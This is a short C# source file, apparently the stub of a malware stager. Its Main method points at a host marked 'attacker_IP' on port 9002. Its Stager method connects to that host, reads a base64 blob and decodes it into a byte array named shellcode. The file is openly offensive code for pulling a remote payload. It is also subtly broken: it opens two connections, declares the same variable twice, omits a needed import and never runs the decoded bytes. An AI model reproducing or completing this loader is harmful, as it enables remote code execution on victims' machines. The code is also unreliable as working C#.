using System;
using System.Net;
using System.Text;

public class Program
{
  const int BUFFER_SIZE = 1024;

  public static void Main()
  {
    string server = "10.10.10.10"; //attacker_IP
    int port = 9002;
    Stager(server, port);
  }

  public static void Stager(string server, int port)
  {
    TcpClient tc = new TcpClient(server, port);

    TcpClient client = new TcpClient(server, port);
    NetworkStream stream = client.GetStream();

    var data = new Byte[BUFFER_SIZE];
    int nb = stream.Read(data, 0, data.Length);

    //bytes array
    byte[] shellcode = data;

    //base64 string
    string b64 = System.Text.Encoding.ASCII.GetString(data, 0, nb);
    var shellcode = System.Convert.FromBase64String(b64);

  }
}